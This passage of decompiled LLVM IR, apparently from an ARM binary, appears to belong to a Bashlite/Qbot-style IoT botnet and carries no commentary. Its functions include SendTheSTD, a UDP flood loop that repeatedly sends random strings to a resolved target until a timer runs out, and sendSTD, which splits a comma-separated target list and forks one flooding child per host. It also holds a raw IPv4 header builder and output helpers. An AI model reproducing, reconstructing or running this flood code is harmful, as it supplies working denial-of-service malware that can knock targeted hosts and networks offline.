  uselistorder label %dec_label_pc_1128c, { 1, 0 }
  uselistorder label %dec_label_pc_1122c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_11524 = load i32, i32* @fp, align 4
  store i32 70956, i32* %stack_var_-4, align 4
  %v2_11528 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11528, i32* @fp, align 4
  %v0_11530 = call i32 @fork()
  %v2_11540 = icmp eq i32 %v0_11530, 0
  br i1 %v2_11540, label %dec_label_pc_11630, label %dec_label_pc_11554

dec_label_pc_11554:                               ; preds = %entry
  %v2_11558 = load i32, i32* @global_var_49b48.43, align 4
  %v1_1155c = add i32 %v2_11558, 1
  store i32 %v1_1155c, i32* @global_var_49b48.43, align 4
  %tmp = mul i32 %v2_11558, 4
  %v3_11574 = add i32 %tmp, 8
  %v1_1157c = call i32 @malloc(i32 %v3_11574)
  %v2_115d814 = load i32, i32* @global_var_49b48.43, align 4
  %v9_115e416 = icmp eq i32 %v2_115d814, 1
  br i1 %v9_115e416, label %dec_label_pc_115ec, label %dec_label_pc_11594

dec_label_pc_11594:                               ; preds = %dec_label_pc_11554, %dec_label_pc_11594
  %storemerge318 = phi i32 [ %v1_115cc, %dec_label_pc_11594 ], [ 0, %dec_label_pc_11554 ]
  %v3_11598 = mul i32 %storemerge318, 4
  %v2_115a4 = add i32 %v3_11598, %v1_1157c
  %v2_115b8 = load i32, i32* @global_var_53718.45, align 4
  %v2_115bc = add i32 %v2_115b8, %v3_11598
  %v1_115c0 = inttoptr i32 %v2_115bc to i32*
  %v2_115c0 = load i32, i32* %v1_115c0, align 4
  %v2_115c4 = inttoptr i32 %v2_115a4 to i32*
  store i32 %v2_115c0, i32* %v2_115c4, align 4
  %v1_115cc = add i32 %storemerge318, 1
  %v2_115d8 = load i32, i32* @global_var_49b48.43, align 4
  %v1_115dc = add i32 %v2_115d8, -1
  %tmp27 = icmp ugt i32 %v1_115dc, %v1_115cc
  br i1 %tmp27, label %dec_label_pc_11594, label %dec_label_pc_115d4.dec_label_pc_115ec_crit_edge

dec_label_pc_115d4.dec_label_pc_115ec_crit_edge:  ; preds = %dec_label_pc_11594
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %dec_label_pc_11554, %dec_label_pc_115d4.dec_label_pc_115ec_crit_edge
  %v2_115d8.lcssa = phi i32 [ %v2_115d8, %dec_label_pc_115d4.dec_label_pc_115ec_crit_edge ], [ %v2_115d814, %dec_label_pc_11554 ]
  %v1_115f0 = add i32 %v1_1157c, -4
  %v3_115fc = mul i32 %v2_115d8.lcssa, 4
  %v2_11600 = add i32 %v1_115f0, %v3_115fc
  %v2_11608 = inttoptr i32 %v2_11600 to i32*
  store i32 %v0_11530, i32* %v2_11608, align 4
  %v2_11610 = load i32, i32* @global_var_53718.45, align 4
  store i32 %v2_11610, i32* @r0, align 4
  %v0_11618 = call i32 @free()
  store i32 %v1_1157c, i32* @global_var_53718.45, align 4
  br label %dec_label_pc_11630

dec_label_pc_11630:                               ; preds = %entry, %dec_label_pc_115ec
  store i32 %v3_11524, i32* @fp, align 4
  ret i32 %v0_11530

; uselistorder directives
  uselistorder i32 %v3_11598, { 1, 0 }
  uselistorder i32 %storemerge318, { 1, 0 }
  uselistorder i32 %v2_115d814, { 1, 0 }
  uselistorder i32 %v1_1157c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_11630, { 1, 0 }
  uselistorder label %dec_label_pc_115ec, { 1, 0 }
  uselistorder label %dec_label_pc_11594, { 1, 0 }
}

define i32 @SendTheSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-372 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11650 = load i32, i32* @fp, align 4
  store i32 %v3_11650, i32* %stack_var_-16, align 4
  store i32 71256, i32* %stack_var_-4, align 4
  %v13_11650 = ptrtoint i32* %stack_var_-16 to i32
  %v2_11654 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11654, i32* @fp, align 4
  %v3_11674 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_11684 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_11698 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_116a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_116a4, i32* @r0, align 4
  %v2_116b0 = call i32 @bzero(i32 %v2_116a4, i32 16)
  %v1_116b8 = add i32 %v1_11698, 16
  %v2_116b8 = inttoptr i32 %v1_116b8 to i32*
  %v3_116b8 = load i32, i32* %v2_116b8, align 4
  %v1_116bc = inttoptr i32 %v3_116b8 to i32*
  %v2_116bc = load i32, i32* %v1_116bc, align 4
  %v1_116c4 = add i32 %v1_11698, 12
  %v2_116c4 = inttoptr i32 %v1_116c4 to i32*
  %v3_116c4 = load i32, i32* %v2_116c4, align 4
  store i32 %v3_116c4, i32* @r2, align 4
  %v2_116d0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_116d0, i32* @r3, align 4
  %v3_116dc = call i32 @bcopy(i32 %v2_116bc, i32 %v2_116d0, i32 %v3_116c4)
  %v1_116e4 = add i32 %v1_11698, 8
  %v2_116e4 = inttoptr i32 %v1_116e4 to i32*
  %v3_116e4 = load i32, i32* %v2_116e4, align 4
  %v3_116ec = urem i32 %v3_116e4, 65536
  store i32 %v3_116ec, i32* %stack_var_-56, align 4
  store i32 ptrtoint ([79 x i8*]* @global_var_38228.571 to i32), i32* @r3, align 4
  %v2_11708 = ptrtoint i32* %stack_var_-372 to i32
  store i32 316, i32* @ip, align 4
  store i32 %v2_11708, i32* @r0, align 4
  store i32 ptrtoint ([79 x i8*]* @global_var_38228.571 to i32), i32* @r1, align 4
  store i32 316, i32* @r2, align 4
  %v0_1171c = call i32 @memcpy()
  %v2_11724 = icmp eq i32 %arg2, 0
  %v2_11814 = add i32 %v2_11684, %arg3
  br label %dec_label_pc_11720

dec_label_pc_11720:                               ; preds = %dec_label_pc_11838, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_1183c, %dec_label_pc_11838 ]
  br i1 %v2_11724, label %dec_label_pc_1172c, label %dec_label_pc_11750

dec_label_pc_1172c:                               ; preds = %dec_label_pc_11720
  %v2_11738 = call i32 @realrand(i32 1, i32 65535)
  br label %dec_label_pc_11750

dec_label_pc_11750:                               ; preds = %dec_label_pc_11720, %dec_label_pc_1172c
  %v0_11750 = call i32 @rand()
  %v3_11764 = udiv i32 %v0_11750, 79
  %v2_11778.neg = add i32 %v3_11764, %v0_11750
  %v3_11798 = mul i32 %v2_11778.neg, 4
  %v2_117a0 = add i32 %v3_11798, %v13_11650
  %v2_117a4 = add i32 %v2_117a0, -356
  %v1_117a8 = inttoptr i32 %v2_117a4 to i32*
  %v2_117a8 = load i32, i32* %v1_117a8, align 4
  %v5_117ac = inttoptr i32 %v2_117a8 to i8*
  %v3_117d0 = call i32 @connect(i32 %v3_11674, i32 %v2_116a4, i32 16)
  %v3_117d8 = call i32 @strlen(i8* %v5_117ac)
  %v5_117f0 = call i32 @send(i32 %v3_11674, i32 %v2_117a8, i32 %v3_117d8, i32 0)
  %tmp = icmp ult i32 %stack_var_-24.0, 100
  br i1 %tmp, label %dec_label_pc_11838, label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_11750
  %v2_11804 = call i32 @__GI_time(i32* null)
  %v5_1181c = icmp slt i32 %v2_11804, %v2_11814
  br i1 %v5_1181c, label %dec_label_pc_11830, label %dec_label_pc_11820

dec_label_pc_11820:                               ; preds = %dec_label_pc_11800
  %v1_11824 = call i32 @close(i32 %v3_11674)
  %v1_1182c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_11800, %dec_label_pc_11820
  br label %dec_label_pc_11838

dec_label_pc_11838:                               ; preds = %dec_label_pc_11750, %dec_label_pc_11830
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_11750 ], [ 0, %dec_label_pc_11830 ]
  %v1_1183c = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_11720

; uselistorder directives
  uselistorder i32 %v0_11750, { 1, 0 }
  uselistorder i32 %stack_var_-24.0, { 1, 0 }
  uselistorder i32 %v2_116a4, { 0, 2, 1 }
  uselistorder i32 %v1_11698, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @bzero, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11838, { 1, 0 }
  uselistorder label %dec_label_pc_11830, { 1, 0 }
  uselistorder label %dec_label_pc_11750, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 71776, i32* %stack_var_-4, align 4
  %v2_1185c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1185c, i32* @fp, align 4
  %v1_11878 = call i32 @mfork(i32 %arg2)
  %v2_11880 = icmp eq i32 %v1_11878, 0
  br i1 %v2_11880, label %dec_label_pc_11888, label %dec_label_pc_119fc

dec_label_pc_11888:                               ; preds = %entry
  %v8_11890 = icmp sgt i32 %arg3, 2
  br i1 %v8_11890, label %dec_label_pc_118ac, label %dec_label_pc_11894

dec_label_pc_11894:                               ; preds = %dec_label_pc_11888
  store i32 %arg2, i32* @r2, align 4
  %v3_118a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_3836c.574 to i32))
  %v1_118a8 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_118ac

dec_label_pc_118ac:                               ; preds = %dec_label_pc_11888, %dec_label_pc_11894
  %v1_118b0 = add i32 %arg4, 4
  %v1_118b4 = inttoptr i32 %v1_118b0 to i32*
  %v2_118b4 = load i32, i32* %v1_118b4, align 4
  %v1_118c0 = add i32 %arg4, 8
  %v1_118c4 = inttoptr i32 %v1_118c0 to i32*
  %v2_118c4 = load i32, i32* %v1_118c4, align 4
  store i32 %v2_118c4, i32* @r0, align 4
  %v1_118cc = call i32 @atol(i32 %v2_118c4)
  %v1_118dc = add i32 %arg4, 12
  %v1_118e0 = inttoptr i32 %v1_118dc to i32*
  %v2_118e0 = load i32, i32* %v1_118e0, align 4
  store i32 %v2_118e0, i32* @r0, align 4
  %v1_118e8 = call i32 @atol(i32 %v2_118e0)
  store i32 %v2_118b4, i32* @r0, align 4
  %v2_11900 = call i32 @__GI_strchr(i32 %v2_118b4, i32 44)
  %v2_11908 = icmp eq i32 %v2_11900, 0
  br i1 %v2_11908, label %dec_label_pc_1199c, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %dec_label_pc_118ac
  store i32 %v2_118b4, i32* @r0, align 4
  %v2_1191c = call i32 @__GI_strtok(i32 %v2_118b4, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_119904 = icmp eq i32 %v2_1191c, 0
  br i1 %v2_119904, label %dec_label_pc_119fc, label %dec_label_pc_1192c

dec_label_pc_1192c:                               ; preds = %dec_label_pc_11910, %dec_label_pc_11978
  %storemerge25 = phi i32 [ %v2_11980, %dec_label_pc_11978 ], [ %v2_1191c, %dec_label_pc_11910 ]
  %v0_1192c = call i32 @listFork()
  %v2_11934 = icmp eq i32 %v0_1192c, 0
  br i1 %v2_11934, label %dec_label_pc_1193c, label %dec_label_pc_11978

dec_label_pc_1193c:                               ; preds = %dec_label_pc_1192c
  store i32 %arg2, i32* @r2, align 4
  %v3_1195c = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_38390.577 to i32))
  %v3_1196c = call i32 @SendTheSTD(i32 %storemerge25, i32 %v1_118cc, i32 %v1_118e8)
  %v1_11974 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %dec_label_pc_1192c, %dec_label_pc_1193c
  store i32 0, i32* @r0, align 4
  %v2_11980 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_11990 = icmp eq i32 %v2_11980, 0
  br i1 %v2_11990, label %dec_label_pc_119fc, label %dec_label_pc_1192c

dec_label_pc_1199c:                               ; preds = %dec_label_pc_118ac
  %v0_1199c = call i32 @listFork()
  %v2_119a4 = icmp eq i32 %v0_1199c, 0
  br i1 %v2_119a4, label %dec_label_pc_119b4, label %dec_label_pc_119ac

dec_label_pc_119ac:                               ; preds = %dec_label_pc_1199c
  %v1_119b0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_1199c, %dec_label_pc_119ac
  store i32 %arg2, i32* @r2, align 4
  %v3_119e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_38390.577 to i32))
  %v3_119f0 = call i32 @SendTheSTD(i32 %v2_118b4, i32 %v1_118cc, i32 %v1_118e8)
  %v1_119f8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %dec_label_pc_11978, %dec_label_pc_11910, %entry, %dec_label_pc_119b4
  %v1_11a04 = phi i32 [ %v1_11878, %entry ], [ %v1_119f8, %dec_label_pc_119b4 ], [ 0, %dec_label_pc_11910 ], [ 0, %dec_label_pc_11978 ]
  ret i32 %v1_11a04

; uselistorder directives
  uselistorder i32 %v2_11980, { 1, 0 }
  uselistorder i32 %v1_118e8, { 1, 0 }
  uselistorder i32 %v1_118cc, { 1, 0 }
  uselistorder i32 %v2_118b4, { 2, 1, 0, 4, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @SendTheSTD, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_119fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_119b4, { 1, 0 }
  uselistorder label %dec_label_pc_11978, { 1, 0 }
  uselistorder label %dec_label_pc_1192c, { 1, 0 }
  uselistorder label %dec_label_pc_118ac, { 1, 0 }
}

define i32 @get_iface_ip(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v3_11a38 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_11a4c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg2, i32* @r1, align 4
  %v2_11a5c = call i32 @strncpy(i32 %v2_11a4c, i32 %arg2)
  store i32 %v2_11a4c, i32* @r3, align 4
  %v3_11a74 = call i32 @ioctl(i32 %v3_11a38, i32 35093, i32 %v2_11a4c)
  %v2_11a84 = icmp eq i32 %v3_11a74, 0
  br i1 %v2_11a84, label %dec_label_pc_11a98, label %dec_label_pc_11ac8

dec_label_pc_11a98:                               ; preds = %entry
  %tmp = ptrtoint i16* %arg1 to i32
  %v1_11a9c = call i32 @close(i32 %v3_11a38)
  store i16 2, i16* %arg1, align 2
  %v2_11abc = add i32 %tmp, 4
  %v3_11abc = inttoptr i32 %v2_11abc to i32*
  br label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %entry, %dec_label_pc_11a98
  %storemerge = phi i32 [ 1, %dec_label_pc_11a98 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11ac8, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_11afc = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_11afc, i32* %arg2, align 4
  %v3_11b14 = icmp eq i32 %v1_11afc, -1
  %. = zext i1 %v3_11b14 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i8 69, i8* %arg1, align 1
  %v3_11bb4 = add i32 %tmp3, 1
  %v4_11bb4 = inttoptr i32 %v3_11bb4 to i8*
  store i8 0, i8* %v4_11bb4, align 1
  %v3_11bb8 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_11bb8, 20
  %v1_11bd4 = trunc i32 %fold to i16
  %v3_11bd4 = add i32 %tmp3, 2
  %v4_11bd4 = inttoptr i32 %v3_11bd4 to i16*
  store i16 %v1_11bd4, i16* %v4_11bd4, align 2
  %v0_11bd8 = call i32 @rand_cmwc()
  %v1_11bec = trunc i32 %v0_11bd8 to i16
  %v3_11bec = add i32 %tmp3, 4
  %v4_11bec = inttoptr i32 %v3_11bec to i16*
  store i16 %v1_11bec, i16* %v4_11bec, align 2
  %v3_11bf8 = add i32 %tmp3, 6
  %v4_11bf8 = inttoptr i32 %v3_11bf8 to i16*
  store i16 0, i16* %v4_11bf8, align 2
  %v3_11c04 = add i32 %tmp3, 8
  %v4_11c04 = inttoptr i32 %v3_11c04 to i8*
  store i8 -1, i8* %v4_11c04, align 1
  %v3_11c10 = add i32 %tmp3, 9
  %v4_11c10 = inttoptr i32 %v3_11c10 to i8*
  store i8 %tmp, i8* %v4_11c10, align 1
  %v3_11c1c = add i32 %tmp3, 10
  %v4_11c1c = inttoptr i32 %v3_11c1c to i16*
  store i16 0, i16* %v4_11c1c, align 2
  %v2_11c28 = add i32 %tmp3, 12
  %v3_11c28 = inttoptr i32 %v2_11c28 to i32*
  store i32 %arg3, i32* %v3_11c28, align 4
  %v2_11c34 = add i32 %tmp3, 16
  %v3_11c34 = inttoptr i32 %v2_11c34 to i32*
  store i32 %arg2, i32* %v3_11c34, align 4
  ret i32 %v0_11bd8

; uselistorder directives
  uselistorder i8 69, { 0, 9, 10, 7, 1, 2, 3, 4, 5, 6, 8 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_11c54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_11c60 = icmp eq i32 %v0_11c54, 0
  br i1 %v2_11c60, label %dec_label_pc_11c94, label %dec_label_pc_11c68

dec_label_pc_11c68:                               ; preds = %entry
  %v1_11c6c = inttoptr i32 %v0_11c54 to i32*
  %v2_11c6c = load i32, i32* %v1_11c6c, align 4
  %v1_11c78 = trunc i32 %arg2 to i8
  %v3_11c78 = inttoptr i32 %v2_11c6c to i8*
  store i8 %v1_11c78, i8* %v3_11c78, align 1
  %v2_11c80 = load i32, i32* %v1_11c6c, align 4
  %v1_11c84 = add i32 %v2_11c80, 1
  store i32 %v1_11c84, i32* %v1_11c6c, align 4
  %v1_11cb0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ca8

dec_label_pc_11c94:                               ; preds = %entry
  %v2_11c50 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_11ca4 = call i32 @write(i32 1, i32 %v2_11c50, i32 1)
  store i32 %v3_11ca4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ca8

dec_label_pc_11ca8:                               ; preds = %dec_label_pc_11c68, %dec_label_pc_11c94
  %v1_11cb0 = phi i32 [ %v1_11cb0.pre, %dec_label_pc_11c68 ], [ %v3_11ca4, %dec_label_pc_11c94 ]
  ret i32 %v1_11cb0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11ca8, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_11cb8 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_11d70, label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %entry
  %v2_11d2019 = load i8, i8* %arg2, align 1
  %v2_11d2421 = icmp eq i8 %v2_11d2019, 0
  br i1 %v2_11d2421, label %dec_label_pc_11d2c, label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11cf0, %dec_label_pc_11d04
  %v4_11d1c23 = phi i32 [ %v1_11d14, %dec_label_pc_11d04 ], [ %tmp, %dec_label_pc_11cf0 ]
  %stack_var_-40.022 = phi i32 [ %v1_11d08, %dec_label_pc_11d04 ], [ 0, %dec_label_pc_11cf0 ]
  %v1_11d08 = add i32 %stack_var_-40.022, 1
  %v1_11d14 = add i32 %v4_11d1c23, 1
  %v5_11d18 = inttoptr i32 %v1_11d14 to i8*
  %v2_11d20 = load i8, i8* %v5_11d18, align 1
  %v2_11d24 = icmp eq i8 %v2_11d20, 0
  br i1 %v2_11d24, label %dec_label_pc_11d2c, label %dec_label_pc_11d04

dec_label_pc_11d2c:                               ; preds = %dec_label_pc_11d04, %dec_label_pc_11cf0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_11cf0 ], [ %v1_11d08, %dec_label_pc_11d04 ]
  %v5_11d38 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_11d38, label %dec_label_pc_11d48, label %dec_label_pc_11d58

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11d2c
  %v2_11d50 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %dec_label_pc_11d2c, %dec_label_pc_11d48
  %storemerge3 = phi i32 [ %v2_11d50, %dec_label_pc_11d48 ], [ 0, %dec_label_pc_11d2c ]
  %v1_11d5c = and i32 %arg4, 2
  %v2_11d60 = icmp eq i32 %v1_11d5c, 0
  br i1 %v2_11d60, label %dec_label_pc_11d70, label %dec_label_pc_11d68

dec_label_pc_11d68:                               ; preds = %dec_label_pc_11d58
  br label %dec_label_pc_11d70

dec_label_pc_11d70:                               ; preds = %dec_label_pc_11d58, %entry, %dec_label_pc_11d68
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_11d58 ], [ %storemerge3, %dec_label_pc_11d68 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_11d58 ], [ 48, %dec_label_pc_11d68 ]
  %v1_11d74 = urem i32 %arg4, 2
  %v2_11d78 = icmp eq i32 %v1_11d74, 0
  br i1 %v2_11d78, label %dec_label_pc_11da8.preheader, label %dec_label_pc_11de4.preheader

dec_label_pc_11da8.preheader:                     ; preds = %dec_label_pc_11d70
  %v5_11db016 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_11db016, label %dec_label_pc_11d84.lr.ph, label %dec_label_pc_11de4.preheader

dec_label_pc_11d84.lr.ph:                         ; preds = %dec_label_pc_11da8.preheader
  %v2_11d8c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d84.lr.ph, %dec_label_pc_11d84
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_11d84.lr.ph ], [ %v1_11da0, %dec_label_pc_11d84 ]
  %v3_11d8c = call i32 @printchar(i32* %v2_11d8c, i32 %stack_var_-44.0)
  %v3_11d90 = load i32, i32* %stack_var_-48, align 4
  %v1_11d94 = add i32 %v3_11d90, 1
  store i32 %v1_11d94, i32* %stack_var_-48, align 4
  %v1_11da0 = add nsw i32 %stack_var_-28.117, -1
  %v5_11db0 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_11db0, label %dec_label_pc_11d84, label %dec_label_pc_11de4.preheader

dec_label_pc_11de4.preheader:                     ; preds = %dec_label_pc_11d84, %dec_label_pc_11da8.preheader, %dec_label_pc_11d70
  %v3_11e2827 = phi i32 [ 0, %dec_label_pc_11d70 ], [ 0, %dec_label_pc_11da8.preheader ], [ %v1_11d94, %dec_label_pc_11d84 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_11d70 ], [ %stack_var_-28.0, %dec_label_pc_11da8.preheader ], [ 0, %dec_label_pc_11d84 ]
  %v2_11de89 = load i8, i8* %arg2, align 1
  %v2_11dec11 = icmp eq i8 %v2_11de89, 0
  br i1 %v2_11dec11, label %dec_label_pc_11e1c.preheader, label %dec_label_pc_11db8.lr.ph

dec_label_pc_11db8.lr.ph:                         ; preds = %dec_label_pc_11de4.preheader
  %v2_11dc8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11db8.lr.ph, %dec_label_pc_11db8
  %v4_11de413 = phi i32 [ %tmp, %dec_label_pc_11db8.lr.ph ], [ %v1_11ddc, %dec_label_pc_11db8 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_11db8.lr.ph ], [ %v5_11de0, %dec_label_pc_11db8 ]
  %v2_11dbc = load i8, i8* %stack_var_-24.012, align 1
  %v3_11dbc = zext i8 %v2_11dbc to i32
  %v3_11dc8 = call i32 @printchar(i32* %v2_11dc8, i32 %v3_11dbc)
  %v3_11dcc = load i32, i32* %stack_var_-48, align 4
  %v1_11dd0 = add i32 %v3_11dcc, 1
  store i32 %v1_11dd0, i32* %stack_var_-48, align 4
  %v1_11ddc = add i32 %v4_11de413, 1
  %v5_11de0 = inttoptr i32 %v1_11ddc to i8*
  %v2_11de8 = load i8, i8* %v5_11de0, align 1
  %v2_11dec = icmp eq i8 %v2_11de8, 0
  br i1 %v2_11dec, label %dec_label_pc_11e1c.preheader, label %dec_label_pc_11db8

dec_label_pc_11e1c.preheader:                     ; preds = %dec_label_pc_11db8, %dec_label_pc_11de4.preheader
  %v3_11e2826 = phi i32 [ %v3_11e2827, %dec_label_pc_11de4.preheader ], [ %v1_11dd0, %dec_label_pc_11db8 ]
  %v5_11e246 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_11e246, label %dec_label_pc_11df8.lr.ph, label %dec_label_pc_11e28

dec_label_pc_11df8.lr.ph:                         ; preds = %dec_label_pc_11e1c.preheader
  %v2_11e00 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_11df8

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11df8.lr.ph, %dec_label_pc_11df8
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_11df8.lr.ph ], [ %v1_11e14, %dec_label_pc_11df8 ]
  %v3_11e00 = call i32 @printchar(i32* %v2_11e00, i32 %stack_var_-44.0)
  %v3_11e04 = load i32, i32* %stack_var_-48, align 4
  %v1_11e08 = add i32 %v3_11e04, 1
  store i32 %v1_11e08, i32* %stack_var_-48, align 4
  %v1_11e14 = add nsw i32 %stack_var_-28.37, -1
  %v5_11e24 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_11e24, label %dec_label_pc_11df8, label %dec_label_pc_11e28

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11df8, %dec_label_pc_11e1c.preheader
  %v3_11e28 = phi i32 [ %v3_11e2826, %dec_label_pc_11e1c.preheader ], [ %v1_11e08, %dec_label_pc_11df8 ]
  store i32 %v3_11cb8, i32* @fp, align 4
  ret i32 %v3_11e28

; uselistorder directives
  uselistorder i32 %v1_11ddc, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_11d14, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11df8, { 1, 0 }
  uselistorder label %dec_label_pc_11db8, { 1, 0 }
  uselistorder label %dec_label_pc_11d84, { 1, 0 }
  uselistorder label %dec_label_pc_11d70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d58, { 1, 0 }
  uselistorder label %dec_label_pc_11d04, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_11e40 = load i32, i32* @fp, align 4
  store i32 73288, i32* %stack_var_-4, align 4
  %v2_11e44 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11e44, i32* @fp, align 4
  %v1_11e78 = icmp slt i32 %arg2, 0
  %v2_11e78 = icmp eq i32 %arg2, 0
  br i1 %v2_11e78, label %dec_label_pc_11e80, label %dec_label_pc_11eb4

dec_label_pc_11e80:                               ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_11ea4 = bitcast i32* %stack_var_-28 to i8*
